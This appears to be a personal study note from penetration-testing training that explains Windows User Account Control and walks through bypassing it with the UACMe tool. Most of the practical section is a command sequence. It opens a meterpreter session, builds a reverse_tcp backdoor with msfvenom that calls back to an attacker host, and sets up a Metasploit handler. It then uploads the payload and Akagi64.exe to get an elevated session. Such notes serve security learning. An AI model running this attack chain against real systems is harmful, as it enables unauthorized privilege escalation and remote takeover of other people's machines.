UAC:
> User Account Control (UAC) is a Windows security
  feature introduced in Windows Vista that is used to
  prevent unauthorized changes from being made to the
  operating system.
> UAC is used to ensure that changes to the operating
  system require approval from the administrator or a user
  account that is part of the local administrators group.
> A non-privileged user attempting to execute a program
  with elevated privileges will be prompted with the UAC
  credential prompt, whereas a privileged user will be
  prompted with a consent prompt.
> Attacks can bypass UAC in order to execute malicious
  executables with elevated privileges.

Bypassing UAC:  
> In order to successfully bypass UAC, we will need to have access to a user account
  that is a part of the local administrators group on the Windows target system.
> UAC allows a program to be executed with administrative privileges, consequently
  prompting the user for confirmation.
> UAC has various integrity levels ranging from low to high, if the UAC protection level
  is set below high, Windows programs can be executed with elevated privileges
  without prompting the user for confirmation.
> There are multiple tools and techniques that can be used to bypass UAC, however, the
  tool and technique used will depend on the version of Windows running on the target system.
  
Using UACME:
> UACMe is an open source, robust privilege escalation tool developed by @hfire0x. It
  can be used to bypass Windows UAC by leveraging various techniques.
  > GitHub: https://github.com/hfiref0x/UACME
> The UACME GitHub repository contains a very well documented list of methods that
  can be used to bypass UAC on multiple versions of Windows ranging from Windows
  7 to Windows 10.
> It allows attackers to execute malicious payloads on a Windows target with
  administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.
> The UACMe GitHub repository has more than 60 exploits that can be used to bypass
  UAC depending on the version of Windows running on the target.
  
Bypassing UAC With UACMe Practical:
> net users                                         // accounts on the machine
> net localgroup administrators                     // Users in the Group of Administrator, but prompted with UAC

> change uac settings from start menu
------------------------------------------------------------------------------------------------------------------
practical steps without GUI - UAC Bypass in reverse shell
> get an meterpreter shell in msfconsole
  > sysinfo                                         // Windows Version, CPU Architecture
  > pgrep explorer                                  // get PID from Process
  > migrate <PID>                                   // migrate to explorer
  > getuid                                          // Username
  > getprivs                                        // see Privileges
  > shell                                           // open cmd shell in new meterpreter session
    > net user                                      // user details
    > net localgroup administrators                 // Users in the Group of Administrator, but prompted with UAC
    > net user <username> <password>                // change password of username - UAC needed
    > STRG + Z
  create backdoor with msfvenom
  > msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local IP> LPORT=<local Port> -f exe > <file>.exe
  create handler
  > msfconsole -q
    > use exploit/multi/handler
    > set payload windows/meterpreter/reverse_tcp
    > set LHOST
    > set LPORT
    > run
  back in meterpreter shell:
  > pwd                                              // get current directory
  > getuid                                           // user information
  > getprivs                                         // see Privileges
  > cd C:\\
  > mkdir Temp
  > cd Temp
  > upload <file>.exe
  > upload Akagi64.exe
  > .\Akagi64.exe <Key> <file>.exe
  > new session with getprivs - more rights
  > migrate to higher priv process
